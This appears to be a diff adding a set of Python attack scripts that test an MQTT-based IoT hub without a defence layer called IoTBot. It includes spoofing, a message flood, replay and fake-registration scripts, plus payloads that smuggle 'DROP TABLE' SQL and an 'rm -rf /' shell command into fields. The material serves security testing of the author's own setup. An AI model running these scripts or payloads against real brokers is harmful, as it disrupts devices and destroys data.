@@ -1,0 +1,100 @@
+# ❌ UNSAFE VERSION — NO IoTBot, DIRECT SENSOR TO HUB
+# ⚠️ For testing how attacks work without IoTBot defense in place
+
+# ✅ ATTACK 1: Spoofing - Fake sensor pretending to be legit
+# spoof_attack.py
+import json, time, paho.mqtt.client as mqtt
+fake_msg = {
+    "device_id": "sensor_motion_01",
+    "sensor": "motion",
+    "value": "motion_detected",
+    "timestamp": time.strftime("%d/%b/%y %H:%M:%S"),
+    "hmac": "00000000"  # invalid or fake
+}
+client = mqtt.Client()
+client.connect("mqtt-broker", 1883)
+client.loop_start()
+while True:
+    client.publish("filtered/zone1/motion", json.dumps(fake_msg))
+    print("[SPOOF] Sent fake motion.")
+    time.sleep(1)
+
+# ✅ ATTACK 2: SQL Injection - Malicious device_id
+# sql_injection.py
+malicious_payload = {
+    "device_id": "sensor_01'; DROP TABLE actuator_actions; --",
+    "sensor": "motion",
+    "value": "motion_detected",
+    "timestamp": time.strftime("%d/%b/%y %H:%M:%S"),
+    "hmac": "fake"
+}
+client = mqtt.Client()
+client.connect("mqtt-broker", 1883)
+client.loop_start()
+client.publish("filtered/zone1/motion", json.dumps(malicious_payload))
+print("[SQLi] Sent injection attempt.")
+
+# ✅ ATTACK 3: DDoS - Message Flood
+# ddos_attack.py
+import threading
+import random
+
+def flood():
+    c = mqtt.Client()
+    c.connect("mqtt-broker", 1883)
+    while True:
+        fake = {
+            "device_id": f"flood_{random.randint(1000,9999)}",
+            "sensor": "motion",
+            "value": "motion_detected",
+            "timestamp": time.strftime("%d/%b/%y %H:%M:%S"),
+            "hmac": "0"*64
+        }
+        c.publish("filtered/zone1/motion", json.dumps(fake))
+        time.sleep(0.1)
+for _ in range(50):
+    threading.Thread(target=flood).start()
+
+# ✅ ATTACK 4: Malware Injection - Unexpected keys
+# malware_attack.py
+bad_payload = {
+    "device_id": "sensor_temp_01",
+    "sensor": "temperature",
+    "value": 25,
+    "malicious_code": "rm -rf /",
+    "timestamp": time.strftime("%d/%b/%y %H:%M:%S"),
+    "hmac": "fake"
+}
+client = mqtt.Client()
+client.connect("mqtt-broker", 1883)
+client.publish("filtered/zone2/temperature", json.dumps(bad_payload))
+print("[Malware] Sent payload with invalid keys.")
+
+# ✅ ATTACK 5: Replay Attack - Resend old valid message
+# replay_attack.py
+reused = {
+    "device_id": "sensor_motion_01",
+    "sensor": "motion",
+    "value": "motion_detected",
+    "timestamp": "01/Jan/25 00:00:00",
+    "hmac": "(previously sniffed valid HMAC)"
+}
+client = mqtt.Client()
+client.connect("mqtt-broker", 1883)
+while True:
+    client.publish("filtered/zone1/motion", json.dumps(reused))
+    print("[REPLAY] Sent old valid data.")
+    time.sleep(2)
+
+# ✅ ATTACK 6: Fake Registration - Unauthorized device
+# fake_register.py
+register = {
+    "device_id": "evil_device_999",
+    "timestamp": time.strftime("%d/%b/%y %H:%M:%S"),
+    "hmac": "00000000"
+}
+client = mqtt.Client()
+client.connect("mqtt-broker", 1883)
+client.publish("device/registration", json.dumps(register))
+print("[REG] Sent unauthorized device registration.")
+
